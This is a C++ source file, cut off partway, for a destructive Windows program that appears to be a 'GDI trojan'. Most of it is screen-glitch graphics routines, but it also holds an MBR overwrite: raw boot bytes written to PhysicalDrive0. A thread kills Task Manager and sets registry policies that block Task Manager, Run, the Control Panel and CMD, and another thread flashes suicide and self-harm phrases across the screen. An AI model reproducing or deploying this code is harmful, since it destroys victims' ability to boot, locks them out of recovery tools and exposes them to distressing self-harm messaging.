#include <windows.h>
#include <tchar.h>
#pragma comment(lib, "winmm.lib")
#define _USE_MATH_DEFINES 1
#include <cmath>
#define M_PI 3.14159265358979323846264338327950288
#pragma comment(lib, "msimg32.lib")
#include <cstdlib>
#include <ctime>
#pragma comment(lib, "advapi32.lib")
#pragma warning(disable : 4996)
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

BOOL win7check() {
	OSVERSIONINFOA osvi;
	ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
	GetVersionExA(&osvi);
	if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 1) {
		return true;
	}
	return false;
}

typedef struct {
	FLOAT h;
	FLOAT s;
	FLOAT v;
} HSV;

namespace Colors {
	RGBQUAD HSVtoRGB(HSV hsv) {
		int hi = (int)floor(hsv.h / 60.0) % 6;
		double f = hsv.h / 60.0 - floor(hsv.h / 60.0);
		double p = hsv.v * (1.0 - hsv.s);
		double q = hsv.v * (1.0 - f * hsv.s);
		double t = hsv.v * (1.0 - (1.0 - f) * hsv.s);
		switch (hi) {
		case 0:
			return { static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(t * 255), static_cast<BYTE>(p * 255) };
		case 1:
			return { static_cast<BYTE>(q * 255), static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(p * 255) };
		case 2:
			return { static_cast<BYTE>(p * 255), static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(t * 255) };
		case 3:
			return { static_cast<BYTE>(p * 255), static_cast<BYTE>(q * 255), static_cast<BYTE>(hsv.v * 255) };
		case 4:
			return { static_cast<BYTE>(t * 255), static_cast<BYTE>(p * 255), static_cast<BYTE>(hsv.v * 255) };
		default:
			return { static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(p * 255), static_cast<BYTE>(q * 255) };
		}
	}

	HSV RGBtoHSV(RGBQUAD rgbquad) {
		HSV hsv;
		double rd = rgbquad.rgbRed / 255.0;
		double gd = rgbquad.rgbGreen / 255.0;
		double bd = rgbquad.rgbBlue / 255.0;
		double cmax = max(max(rd, gd), bd);
		double cmin = min(min(rd, gd), bd);
		double delta = cmax - cmin;
		hsv.v = cmax;
		if (cmax > 0.0) hsv.s = delta / cmax;
		else hsv.s = 0.0;
		if (delta > 0.0) {
			if (cmax == rd) hsv.h = 60.0 * fmod((gd - bd) / delta, 6.0);
			else if (cmax == gd) hsv.h = 60.0 * ((bd - rd) / delta + 2.0);
			else if (cmax == bd) hsv.h = 60.0 * ((rd - gd) / delta + 4.0);
			if (hsv.h < 0.0) hsv.h += 360.0;
		}
		else {
			hsv.h = 0.0;
		}
		return hsv;
	}
}

namespace Math
{
	FLOAT SineWave(FLOAT a, FLOAT b, FLOAT c, FLOAT d)
	{
		return a * sin(2 * M_PI * b * c / d);
	}
}

int w = GetSystemMetrics(0);
int h = GetSystemMetrics(1);
int shakeIntensity = 1;
int warpIntensity = 3;
bool random = true;
double intensity = 0.0;
bool state = false;

typedef struct {
	float x;
	float y;
	float z;
} VERTEX;

typedef struct {
	int vtx0;
	int vtx1;
} EDGE;

COLORREF COLORHSL(int length) {
	double h = fmod(length, 360.0);
	double s = 1.0;
	double l = 0.5;
	double c = (1.0 - fabs(2.0 * l - 1.0)) * s;
	double x = c * (1.0 - fabs(fmod(h / 60.0, 2.0) - 1.0));
	double m = l - c / 2.0;
	double r1, g1, b1;
	if (h < 60) {
		r1 = c; g1 = x; b1 = 0;
	}
	else if (h < 120) {
		r1 = x; g1 = c; b1 = 0;
	}
	else if (h < 180) {
		r1 = 0; g1 = c; b1 = x;
	}
	else if (h < 240) {
		r1 = 0; g1 = x; b1 = c;
	}
	else if (h < 300) {
		r1 = x; g1 = 0; b1 = c;
	}
	else {
		r1 = c; g1 = 0; b1 = x;
	}
	int red = static_cast<int>((r1 + m) * 255);
	int green = static_cast<int>((g1 + m) * 255);
	int blue = static_cast<int>((b1 + m) * 255);
	return RGB(red, green, blue);
}

struct Point3D {
	float x, y, z;
};

void DrawEllipseAt(HDC hdc, int x, int y, COLORREF color) {
	HBRUSH brush = CreateSolidBrush(color);
	SelectObject(hdc, brush);
	DrawIcon(hdc, x - 20, y - 20, LoadIcon(NULL, MAKEINTRESOURCE(32512 + (rand() % 7))));
	DeleteObject(brush);
}

Point3D RotatePoint(Point3D point, float angleX, float angleY, float angleZ) {
	float cosX = cos(angleX), sinX = sin(angleX);
	float cosY = cos(angleY), sinY = sin(angleY);
	float cosZ = cos(angleZ), sinZ = sin(angleZ);
	float y = point.y * cosX - point.z * sinX;
	float z = point.y * sinX + point.z * cosX;
	point.y = y; point.z = z;
	float x = point.x * cosY + point.z * sinY;
	z = -point.x * sinY + point.z * cosY;
	point.x = x; point.z = z;
	x = point.x * cosZ - point.y * sinZ;
	y = point.x * sinZ + point.y * cosZ;
	point.x = x; point.y = y;
	return point;
}

void Draw3DCube(HDC hdc, Point3D center, float size, float angleX, float angleY, float angleZ, float colorA) {
	Point3D vertices[8] = {
		{-size, -size, -size},
		{size, -size, -size},
		{size, size, -size},
		{-size, size, -size},
		{-size, -size, size},
		{size, -size, size},
		{size, size, size},
		{-size, size, size},
	};
	POINT screenPoints[8];
	for (int i = 0; i < 8; ++i) {
		Point3D rotated = RotatePoint(vertices[i], angleX, angleY, angleZ);
		COLORREF color = COLORHSL(colorA);
		int screenX = static_cast<int>(center.x + rotated.x);
		int screenY = static_cast<int>(center.y + rotated.y);
		screenPoints[i].x = screenX;
		screenPoints[i].y = screenY;
		DrawEllipseAt(hdc, screenX, screenY, color);
	}
	POINT polyline1[5] = { screenPoints[0], screenPoints[1], screenPoints[2], screenPoints[3], screenPoints[0] };
	Polyline(hdc, polyline1, 5);
	POINT polyline2[5] = { screenPoints[4], screenPoints[5], screenPoints[6], screenPoints[7], screenPoints[4] };
	Polyline(hdc, polyline2, 5);
	POINT connectingLines[8] = {
		screenPoints[0], screenPoints[4],
		screenPoints[1], screenPoints[5],
		screenPoints[2], screenPoints[6],
		screenPoints[3], screenPoints[7]
	};
	Polyline(hdc, &connectingLines[0], 2);
	Polyline(hdc, &connectingLines[2], 2);
	Polyline(hdc, &connectingLines[4], 2);
	Polyline(hdc, &connectingLines[6], 2);
}

const unsigned char MasterBootRecord[] = {
0x31, 0xDB, 0x8E, 0xDB, 0xBC, 0x00, 0x7C, 0xDB, 0xE3, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0x31, 0xC0, 0x8E,
0xC0, 0xBF, 0x00, 0x7E, 0xB9, 0x00, 0x02, 0xF3, 0xAA, 0xFF, 0x06, 0x20, 0x7E, 0xD9, 0x06, 0x00, 0x7E, 0xD8,
0x06, 0xD7, 0x7D, 0xD9, 0x16, 0x00, 0x7E, 0xD9, 0xFB, 0xD9, 0x1E, 0x08, 0x7E, 0xD9, 0x1E, 0x04, 0x7E, 0xD9,
0x06, 0xD3, 0x7D, 0xD8, 0x06, 0xD7, 0x7D, 0xD9, 0x16, 0xD3, 0x7D, 0xD9, 0xFB, 0xD9, 0x1E, 0x10, 0x7E, 0xD9,
0x1E, 0x0C, 0x7E, 0xBB, 0x00, 0x30, 0xB0, 0x7F, 0x8E, 0xC3, 0x31, 0xFF, 0xB9, 0x00, 0xFA, 0xF3, 0xAA, 0x30, 0xC0,
0xBB, 0x00, 0x20, 0x8E, 0xC3, 0x31, 0xFF, 0xB9, 0x00, 0xFA, 0xF3, 0xAA, 0xBB, 0xCF, 0xFF, 0xD9, 0x06, 0x00, 0x7E,
0xD9, 0xFE, 0xD8, 0x0E, 0xDB, 0x7D, 0xDF, 0x1E, 0x22, 0x7E, 0x8B, 0x0E, 0x22, 0x7E, 0x83, 0xC1, 0x32, 0xBD, 0x63,
0x00, 0xB8, 0x16, 0xFE, 0xBA, 0xDE, 0x03, 0xBE, 0x04, 0x00, 0xE8, 0x3D, 0x00, 0x87, 0xD9, 0xF7, 0xDB, 0x4E, 0x75,
0xF6, 0xBE, 0x05, 0x00, 0x91, 0xF7, 0xD9, 0xE8, 0x2D, 0x00, 0xBE, 0x06, 0x00, 0xF7, 0xD8, 0xF7, 0xD9, 0xE8, 0x23,
0x00, 0x91, 0xF7, 0xD9, 0x40, 0x4A, 0x75, 0xD9, 0x43, 0x4D, 0x75, 0xCF, 0x1E, 0xB8, 0x00, 0x20, 0x8E, 0xD8, 0xB8,
0x00, 0xA0, 0x8E, 0xC0, 0x31, 0xF6, 0x31, 0xFF, 0xB9, 0x00, 0xFA, 0xF3, 0xA4, 0x1F, 0xE9, 0x50, 0xFF, 0x66, 0x60, 0xA3,
0x14, 0x7E, 0x89, 0x1E, 0x18, 0x7E, 0x89, 0x0E, 0x1C, 0x7E, 0xDF, 0x06, 0x14, 0x7E, 0xD9, 0x1E, 0x14, 0x7E, 0xDF, 0x06,
0x18, 0x7E, 0xD9, 0x1E, 0x18, 0x7E, 0xDF, 0x06, 0x1C, 0x7E, 0xD9, 0x1E, 0x1C, 0x7E, 0xD9, 0x06, 0x04, 0x7E, 0xD9, 0x06,
0x08, 0x7E, 0xD9, 0x06, 0x18, 0x7E, 0xD8, 0xC9, 0xD9, 0x06, 0x1C, 0x7E, 0xD8, 0xCB, 0xDE, 0xE9, 0xD9, 0x06, 0x18, 0x7E,
0xD8, 0xCB, 0xD9, 0x06, 0x1C, 0x7E, 0xD8, 0xCB, 0xDE, 0xC1, 0xD9, 0x1E, 0x1C, 0x7E, 0xD9, 0x1E, 0x18, 0x7E, 0xDD, 0xD8,
0xDD, 0xD8, 0xD9, 0x06, 0x0C, 0x7E, 0xD9, 0x06, 0x10, 0x7E, 0xD9, 0x06, 0x14, 0x7E, 0xD8, 0xC9, 0xD9, 0x06, 0x1C, 0x7E, 0xD8,
0xCB, 0xDE, 0xC1, 0xD9, 0x06, 0x14, 0x7E, 0xD8, 0xCB, 0xD9, 0x06, 0x1C, 0x7E, 0xD8, 0xCB, 0xDE, 0xE9, 0xD9, 0xC0, 0xD8, 0x0E,
0xCB, 0x7D, 0xDF, 0x1E, 0x1C, 0x7E, 0xD8, 0x06, 0xC7, 0x7D, 0xD9, 0x06, 0x18, 0x7E, 0xD8, 0xF1, 0xD8, 0x0E, 0xCF, 0x7D, 0xDF,
0x1E, 0x18, 0x7E, 0xDE, 0xF9, 0xD8, 0x0E, 0xCF, 0x7D, 0xDF, 0x1E, 0x14, 0x7E, 0xDD, 0xD8, 0xDD, 0xD8, 0x8B, 0x3E, 0x20, 0x7E,
0xC1, 0xEF, 0x04, 0x01, 0xFE, 0x83, 0xE6, 0x0F, 0x8A, 0x9C, 0xDF, 0x7D, 0x8B, 0x36, 0x14, 0x7E, 0x8B, 0x3E, 0x18, 0x7E, 0x81,
0xC6, 0xA0, 0x00, 0x83, 0xC7, 0x64, 0x81, 0xFE, 0x40, 0x01, 0x7D, 0x2C, 0x85, 0xF6, 0x78, 0x28, 0x81, 0xFF, 0xC8, 0x00, 0x7D,
0x22, 0x85, 0xFF, 0x78, 0x1E, 0x69, 0xFF, 0x40, 0x01, 0x01, 0xF7, 0xB9, 0x00, 0x30, 0xBE, 0x00, 0x20, 0xA0, 0x1C, 0x7E, 0x8E,
0xC1, 0x26, 0x3A, 0x05, 0x7D, 0x08, 0x26, 0x88, 0x05, 0x8E, 0xC6, 0x26, 0x88, 0x1D, 0x8E, 0xC6, 0x66, 0x61, 0xC3, 0x00, 0x00,
0x00, 0x40, 0x00, 0x00, 0x96, 0x43, 0x9A, 0x99, 0x99, 0x3F, 0x00, 0x00, 0x20, 0x43, 0x00, 0x00, 0x00, 0x40, 0x0A, 0xD7, 0xA3, 0x3B,
0x00, 0x00, 0x70, 0x41, 0x20, 0x22, 0x23, 0x25, 0x26, 0x27, 0x28, 0x2A, 0x2C, 0x2D, 0x2F, 0x30, 0x32, 0x34, 0x36, 0x37, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

void mbr() {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);
	WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
	CloseHandle(hDevice);
}

DWORD WINAPI disable(LPVOID lpvd) {
	system("taskkill /f /im taskmgr.exe");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
	system("REG add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f");
	return 1;
}

DWORD WINAPI shake(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC mdc = CreateCompatibleDC(hdc);
	HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(mdc, hbit);
	while (true) {
		hdc = GetDC(NULL);
		for (int i = 1; i <= shakeIntensity; i++) {
			StretchBlt(mdc, rand() % 3, rand() % 3, w, h, hdc, rand() % 3, rand() % 3, w, h, SRCCOPY);
			StretchBlt(hdc, 0, 0, w, h, mdc, 0, 0, w, h, SRCCOPY);
		}
		ReleaseDC(0, hdc);
		if (rand() % 10 == 5) InvalidateRect(0, 0, 0);
	}
	return 0x00;
}

DWORD WINAPI overdose(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC mdc = CreateCompatibleDC(hdc);
	int ws = w / 16, hs = h / 16;
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = ws;
	bmpi.bmiHeader.biHeight = hs;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HBITMAP hbit = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(mdc, hbit);
	INT i = 0;
	while (true) {
		hdc = GetDC(0);
		HBRUSH hbsh = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(mdc, hbsh);
		SelectObject(hdc, hbsh);
		StretchBlt(mdc, 0, 0, ws, hs, hdc, 0, 0, w, h, !(rand() % 2) ? SRCPAINT : PATINVERT);
		for (int x = 0; x < ws; x++) {
			for (int y = 0; y < hs; y++) {
				int index = y * ws + x;
				int i = rand() % 10;
				rgbquad[index].rgbRed += i;
				rgbquad[index].rgbGreen += i;
				rgbquad[index].rgbBlue += i;
			}
		}
		StretchBlt(hdc, 0, 0, w, h, mdc, 0, 0, ws, hs, !(rand() % 2) ? SRCPAINT : PATINVERT);
		ReleaseDC(0, hdc);
		if (rand() % 10 == 5) InvalidateRect(0, 0, 0);
	}
	return 0x00;
}

DWORD WINAPI xorroto(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC mdc = CreateCompatibleDC(hdc);
	int ws = w / 4, hs = h / 4;
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = ws;
	bmpi.bmiHeader.biHeight = hs;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HBITMAP hbit = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(mdc, hbit);
	INT i = 0;
	DOUBLE angle = 0.f;
	while (true) {
		hdc = GetDC(0);
		StretchBlt(mdc, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < ws; x++) {
			for (int y = 0; y < hs; y++) {
				int index = y * ws + x;
				int cx = (x - (ws / 2));
				int cy = (y - (hs / 2));
				int zx = cos(angle) * cx - sin(angle) * cy;
				int zy = sin(angle) * cx + cos(angle) * cy;
				int fx = (zx + i) ^ (zy + i);
				rgbquad[index].rgbRed += fx;
				rgbquad[index].rgbGreen += fx;
				rgbquad[index].rgbBlue += fx;
			}
		}
		i++; angle += 0.01f;
		StretchBlt(hdc, 0, 0, w, h, mdc, 0, 0, ws, hs, SRCCOPY);
		ReleaseDC(0, hdc);
		if (rand() % 10 == 5) InvalidateRect(0, 0, 0);
	}
	return 0x00;
}

DWORD WINAPI absroto(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC mdc = CreateCompatibleDC(hdc);
	int ws = w / 4, hs = h / 4;
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = ws;
	bmpi.bmiHeader.biHeight = hs;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HBITMAP hbit = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(mdc, hbit);
	INT i = 0;
	double angle = 0.f;
	while (true) {
		hdc = GetDC(0);
		StretchBlt(mdc, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < ws; x++) {
			for (int y = 0; y < hs; y++) {
				int index = y * ws + x;
				int cx = abs(x - (ws / 2));
				int cy = abs(y - (hs / 2));
				int zx = cos(angle) * cx - sin(angle) * cy;
				int zy = sin(angle) * cx + cos(angle) * cy;
				int fx = (zx + i) ^ (zy + i);
				rgbquad[index].rgbRed += fx;
				rgbquad[index].rgbGreen += fx;
				rgbquad[index].rgbBlue += fx;
			}
		}
		i++; angle += 0.01f;
		StretchBlt(hdc, 0, 0, w, h, mdc, 0, 0, ws, hs, SRCCOPY);
		ReleaseDC(0, hdc);
		if (rand() % 10 == 5) InvalidateRect(0, 0, 0);
	}
	return 0x00;
}

DWORD WINAPI hftnxor(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC mdc = CreateCompatibleDC(hdc);
	int ws = w / 4, hs = h / 4;
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = ws;
	bmpi.bmiHeader.biHeight = hs;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HBITMAP hbit = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(mdc, hbit);
	INT i = 0;
	double angle = 0.f;
	SetStretchBltMode(mdc, 4);
	SetStretchBltMode(hdc, 4);
	while (true) {
		hdc = GetDC(0);
		StretchBlt(mdc, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < ws; x++) {
			for (int y = 0; y < hs; y++) {
				int index = y * ws + x;
				int cx = abs(x - (ws / 2));
				int cy = abs(y - (hs / 2));
				int zx = cos(angle) * cx - sin(angle) * cy;
				int zy = sin(angle) * cx + cos(angle) * cy;
				int fx = (zx + i) ^ (zy + i);
				rgbquad[index].rgbRed += fx;
				rgbquad[index].rgbGreen += fx;
				rgbquad[index].rgbBlue += fx;
			}
		}
		i++; angle += 0.01f;
		StretchBlt(hdc, 0, 0, w, h, mdc, 0, 0, ws, hs, SRCCOPY);
		ReleaseDC(0, hdc);
		if (rand() % 10 == 5) InvalidateRect(0, 0, 0);
	}
	return 0x00;
}

DWORD WINAPI initial(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC mdc = CreateCompatibleDC(hdc);
	int ws = w / 8, hs = h / 8;
	BLENDFUNCTION blur = { 0 };
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = ws;
	bmpi.bmiHeader.biHeight = hs;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HBITMAP hbit = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(mdc, hbit);
	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 20;
	INT i = 0;
	while (true) {
		hdc = GetDC(0);
		StretchBlt(mdc, rand() % 1, rand() % 1, ws, hs, hdc, rand() % -1, rand() % -1, w, h, SRCCOPY);
		for (int x = 0; x < ws; x++) {
			for (int y = 0; y < hs; y++) {
				int index = y * ws + x;
				rgbquad[index].rgbRed += i;
				rgbquad[index].rgbGreen += i;
				rgbquad[index].rgbBlue += i;
			}
		}
		i++;
		AlphaBlend(hdc, 0, 0, w, h, mdc, 0, 0, ws, hs, blur);
		ReleaseDC(0, hdc);
		if (rand() % 10 == 5) InvalidateRect(0, 0, 0);
	}
	return 0x00;
}

DWORD __stdcall textout(LPVOID lpvd) {
	while (true) {
		HDC hdc = GetDC(0);
		HFONT hfnt = CreateFontA(50, 20, rand() % 60, 400, FW_BOLD, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Fredoka");
		SelectObject(hdc, hfnt);
		LPCSTR things[] = { "do pills work?", "I don't want live anymore", "waiting for my end", "everyday is a infinite loop", "my thoughts are killing me", "kill me!", "dissociating", "fleeing reality", "am I real?", "I'm not safe", "HELP ME!", "cold.", "transcending", "anxiety", "hear the voices", "trapped by illusion", "full of emptiness", "dreaming forever", "questioning my existence", "losing control regressively", "pain", "don't want to suffer anymore", "panic attacks", "dark forever", "faking my happiness", "seeking eternal peace", "can't breathe", "sad", "existential Crisis", "viewing shadows", "beyond the stars", "alone", "can't kill myself", "what am I?", "made with rotten flesh", "isolated", "wearing masks", "my final destination", "hurting myself", "farewell"  };
		int thing = rand() % _countof(things);
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		SetBkColor(hdc, RGB(rand() % 160, rand() % 160, rand() % 160));
		TextOutA(hdc, rand() % w, rand() % h, things[thing], strlen(things[thing]));
		DeleteObject(hfnt);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
}

DWORD WINAPI hell1(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		BitBlt(hdc, 1, 0, w, h, hdc, 0, 1, 0x999999);
		BitBlt(hdc, 1, 0, w, h, hdc, 0, 1, SRCINVERT);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI warp(LPVOID lpvd) {
	HDC hdc = GetDC(0);
	HDC mdc = CreateCompatibleDC(hdc);
	float warpIntensity = 3;
	while (true) {
		hdc = GetDC(0);
		for (int i = 1; i <= warpIntensity; i++) {
			int size = rand() % 400;
			int wsrc = rand() % w;
			int hsrc = rand() % h;
			BitBlt(hdc, wsrc + rand() % i, hsrc + rand() % i, size, size, hdc, wsrc, hsrc, SRCCOPY);
		}
		ReleaseDC(0, hdc);
		if (rand() % 10 == 5) InvalidateRect(0, 0, 0);
	}
	return 0x00;
}

DWORD WINAPI tesseract(LPVOID lpvd) {
	int sx = 1, sy = 1;
	int incrementor = 5;
	float x2 = 100.0f;
	float y2 = 100.0f;
	float angleX = 0.0f;
	float angleY = 0.0f;
	float angleZ = 0.0f;
	float angleIncrement = 0.05f;
	float colorA = 0;
	float size = 0.0f;
	while (true) {
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(0);
		int y = GetSystemMetrics(1);
		x2 += incrementor * sx;
		y2 += incrementor * sy;
		if (x2 + 75 >= x) {
			sx = -1;
			x2 = x - 76;
		}
		else if (x2 <= 75) {
			sx = 1;
			x2 = 76;
		}
		if (y2 + 75 >= y) {
			sy = -1;
			y2 = y - 76;
		}
		else if (y2 <= 75) {
			sy = 1;
			y2 = 76;
		}
		Point3D center = { x2, y2, 0.0f };
		Draw3DCube(hdc, center, size, angleX, angleY, angleZ, colorA);
		angleX += angleIncrement;
		angleY += angleIncrement;
		angleZ += angleIncrement;
		Sleep(10);
		ReleaseDC(0, hdc);
		colorA += 1;
		if (size >= 0 && size <= 100) {
			size += 0.5;
		}
	}
	return 0;
}

DWORD WINAPI ellipse(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC mdc = CreateCompatibleDC(hdc);
	int ws = w / 4, hs = h / 4;
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = ws;
	bmpi.bmiHeader.biHeight = hs;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HBITMAP hbit = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(mdc, hbit);
	INT i = 0;
	FLOAT a = 5.0, b = 3.0;
	SetStretchBltMode(hdc, 3);
	SetStretchBltMode(mdc, 3);
	while (true) {
		hdc = GetDC(0);
		StretchBlt(mdc, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCCOPY);
		int randx = rand() % ws;
		int randy = rand() % hs;
		for (int x = 0; x < ws; x++) {
			for (int y = 0; y < hs; y++) {
				int index = y * ws + x;
				int cx = x - randx;
				int cy = y - randy;
				int zx = (cx * cx) / (a * a);
				int zy = (cy * cy) / (b * b);
				int fx = 128.0 + (128.0 * sin(sqrt(zx + zy) / 6.0));
				HSV hsv = Colors::RGBtoHSV(rgbquad[index]);
				hsv.h = fmod(fx + i, 360.0);
				rgbquad[index] = Colors::HSVtoRGB(hsv);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, mdc, 0, 0, ws, hs, SRCCOPY);
		ReleaseDC(0, hdc);
		if (rand() % 10 == 5) InvalidateRect(0, 0, 0);
	}
	return 0x00;
}

DWORD WINAPI wave(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	int i = 0;
	while (true) {
		hdc = GetDC(NULL);
		int waveAmplitude = rand() % 3;
		int wavePhase = rand() % 20;
		if (rand() % 25 == 0) {
			for (int y = 0; y < h; y++) {
				int zx = Math::SineWave(waveAmplitude, y + i * 4, wavePhase, h);
				BitBlt(hdc, 0, y, w - zx, 1, hdc, zx, y, SRCCOPY);
			}
			i++;
		}
		ReleaseDC(0, hdc);
	}
	return 0x00;
}

DWORD WINAPI freq(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	int i = 0;
	while (true) {
		hdc = GetDC(NULL);
		for (int y = 0; y < h; y++) {
			int wavePhase = rand() % 70 - 40;
			int zx = Math::SineWave(5, y + i * 4, wavePhase, h);
			BitBlt(hdc, 0, y, w - zx, 1, hdc, zx, y, SRCCOPY);
		}
		ReleaseDC(0, hdc);
		i++;
	}
	return 0x00;
}

DWORD WINAPI center(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC mdc = CreateCompatibleDC(hdc);
	int ws = w / 4, hs = h / 4;
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = ws;
	bmpi.bmiHeader.biHeight = hs;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HBITMAP hbit = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(mdc, hbit);
	INT i = 32;
	SetStretchBltMode(hdc, 3);
	SetStretchBltMode(mdc, 3);
	while (true) {
		hdc = GetDC(0);
		StretchBlt(mdc, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCCOPY);
		for (int x = 0; x < ws; x++) {
			for (int y = 0; y < hs; y++) {
				int index = y * ws + x;
				int cx = x - (ws / 2);
				int cy = y - (hs / 2);
				int zx = (cx * cx);
				int zy = (cy * cy);
				int di = 128.0 + i;
				int fx = di + (di * sin(sqrt(zx + zy) / 32.0));
				HSV hsv = Colors::RGBtoHSV(rgbquad[index]);
				hsv.h = fmod(fx + i, 360.0);
				rgbquad[index] = Colors::HSVtoRGB(hsv);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, mdc, 0, 0, ws, hs, SRCCOPY);
		ReleaseDC(0, hdc);
		if (rand() % 10 == 5) InvalidateRect(0, 0, 0);
	}
	return 0x00;
}

DWORD WINAPI colors(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC mdc = CreateCompatibleDC(hdc);
	int ws = w / 1, hs = h / 1;
	BITMAPINFO bmpi = { 0 };
